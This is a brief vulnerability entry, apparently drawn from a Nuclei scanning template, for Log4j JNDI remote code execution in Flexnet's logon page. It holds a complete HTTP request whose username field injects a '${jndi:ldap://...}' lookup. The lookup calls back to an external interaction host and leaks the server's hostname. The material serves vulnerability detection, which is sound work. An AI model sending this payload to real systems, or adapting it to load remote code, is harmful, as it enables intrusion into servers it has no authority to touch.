# Vulnerability: Flexnet - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`flexnet-log4j-rce.yaml`)

## Description
Flexnet is susceptible to Log4j JNDI remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /flexnet/logon.do HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}/flexnet/logon.do
Content-Type: application/x-www-form-urlencoded

action=logon&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}&domain=FLEXnet
```

